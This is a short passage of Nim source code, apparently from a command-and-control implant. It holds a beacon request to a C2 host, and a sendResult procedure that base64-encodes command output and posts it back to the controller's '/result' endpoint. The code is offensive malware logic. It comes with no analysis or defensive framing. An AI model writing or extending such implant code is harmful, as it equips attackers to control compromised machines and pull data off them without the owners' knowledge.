    return client.getContent(C2_HOST & "/beacon")
  except HttpRequestError:
    return ""

proc sendResult(client: HttpClient, output: string) =
  ## POST base64-encoded result back to C2
  let encoded = encode(output)
  discard client.postContent(C2_HOST & "/result", body = encoded)

